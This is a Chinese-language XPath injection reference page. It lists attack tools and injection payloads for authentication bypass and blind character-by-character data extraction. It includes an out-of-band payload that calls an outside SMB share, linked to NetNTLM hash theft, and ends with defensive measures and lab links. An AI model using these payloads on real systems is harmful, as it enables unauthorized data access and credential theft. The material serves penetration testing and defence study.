# XPath 注入

> XPath 注入是一种攻击技术，利用应用程序从用户提供的输入构造 XPath（XML 路径语言）查询来查询或导航 XML 文档的漏洞。

## XPath 注入原理

XPath 注入是一种针对使用 XPath 查询语言的应用程序的攻击技术。当应用程序使用未经验证的用户输入来构造 XPath 查询时，攻击者可以注入恶意 XPath 代码，从而操纵查询逻辑，导致未授权数据访问或其他恶意操作。

### 漏洞成因

1. **未经验证的用户输入**：应用程序直接将用户输入拼接到 XPath 查询中
2. **缺乏输入验证**：未对用户输入进行适当的验证和过滤
3. **错误处理不当**：详细的错误信息可能泄露敏感信息

### 攻击面

- **认证绕过**：修改查询条件绕过身份验证
- **信息泄露**：提取敏感数据
- **权限提升**：访问未授权的数据
- **拒绝服务**：构造复杂的 XPath 查询消耗服务器资源

### 影响

- 未授权访问敏感数据
- 认证绕过
- 服务器端请求伪造 (SSRF)
- 拒绝服务 (DoS)

## 目录

* [工具](#工具)
* [方法学](#方法学)
    * [盲注利用](#盲注利用)
    * [带外利用](#带外利用)
* [实验](#实验)
* [防御措施](#防御措施)
* [参考资料](#参考资料)

## 工具

* [orf/xcat](https://github.com/orf/xcat) - 自动化 XPath 注入攻击以检索文档
* [feakk/xxxpwn](https://github.com/feakk/xxxpwn) - 高级 XPath 注入工具
* [aayla-secura/xxxpwn_smart](https://github.com/aayla-secura/xxxpwn_smart) - 使用预测文本的 xxxpwn 分支
* [micsoftvn/xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer) - XPath 盲注利用工具
* [Harshal35/XmlChor](https://github.com/Harshal35/XMLCHOR) - XPath 注入利用工具

## 方法学

与 SQL 注入类似，您需要正确终止查询：

```ps1
string(//user[name/text()='" +vuln_var1+ "' and password/text()='" +vuln_var1+ "']/account/text())
```

```sql
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
')] | //user/*[contains(*,'
') and contains(../password,'c
') and starts-with(../password,'c
```

### 盲注利用

1. 字符串长度

    ```sql
    and string-length(account)=SIZE_INT
    ```

2. 使用 `substring` 访问字符，并使用 `codepoints-to-string` 函数验证其值

    ```sql
    substring(//user[userid=5]/username,2,1)=CHAR_HERE
    substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
    ```

### 带外利用

```powershell
http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')
```

## 实验

* [Root Me - XPath 注入 - 认证](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-Authentication)
* [Root Me - XPath 注入 - 字符串](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-String)
* [Root Me - XPath 注入 - 盲注](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-Blind)

## 防御措施

### 输入验证
- 对所有用户输入进行严格验证
- 使用白名单验证允许的字符和格式
- 拒绝包含 XPath 特殊字符的输入

### 参数化查询
- 使用参数化 XPath 查询
- 使用预编译的 XPath 表达式
- 避免字符串拼接构造查询

### 最小权限原则
- 限制数据库用户权限
- 只授予必要的最低权限
- 使用只读账户进行查询

### 安全配置
- 禁用详细的错误信息
- 配置 Web 服务器不返回详细的错误信息
- 记录和监控可疑活动

### 安全开发实践
- 使用 ORM 框架而非原始 XPath 查询
- 实施内容安全策略 (CSP)
- 定期进行安全审计和渗透测试

## 参考资料

* [窃取 NetNTLM 哈希值的关键位置 - Osanda Malith Jayathissa - 2017年3月24日](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
* [XPath 注入 - OWASP - 2015年1月21日](https://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010))
